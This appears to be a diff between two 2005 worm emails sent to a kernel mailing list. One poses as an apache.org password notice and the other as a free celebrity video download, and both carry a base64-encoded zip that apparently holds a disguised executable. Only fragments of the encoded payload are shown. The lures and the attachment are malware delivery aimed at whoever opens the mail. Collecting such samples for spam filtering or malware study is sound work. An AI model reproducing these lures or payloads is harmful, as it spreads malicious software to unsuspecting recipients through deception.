@@ -1,9 +1,9 @@
-From: hostmaster@apache.org
-Subject: Your Password
-Date: Sat, 24 Dec 2005 01:19:07 GMT
-Message-ID: <8afa.3eed0e47dbb7eb5@apache.org>
+From: hostmaster@iname.com
+Subject: Paris_Hilton_&_Nicole_Richie
+Date: Sat, 24 Dec 2005 01:56:27 GMT
+Message-ID: <6ae3.a15f4a1434c7@iname.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="====fadebf8bfaa.d6"
+Content-Type: multipart/mixed; boundary="==0c004112dad8"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
 To: emailserv@oss.sgi.com
@@ -13,17 +13,18 @@ List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---====fadebf8bfaa.d6
+--==0c004112dad8
 
-Protected message is attached!
+The Simple Life:
 
+View Paris Hilton & Nicole Richie video clips , pictures & more ;)
+Download is free until Jan, 2006!
 
-***** Go to: http://www.apache.org
-***** Email: postman@apache.org
---====fadebf8bfaa.d6
-Content-Type: application/octet-stream; name=reg_pass.zip
+Please use our Download manager.
+--==0c004112dad8
+Content-Type: application/octet-stream; name=downloadm.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass.zip"
+Content-Disposition: attachment; filename="downloadm.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1001,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---====fadebf8bfaa.d6--
+--==0c004112dad8--
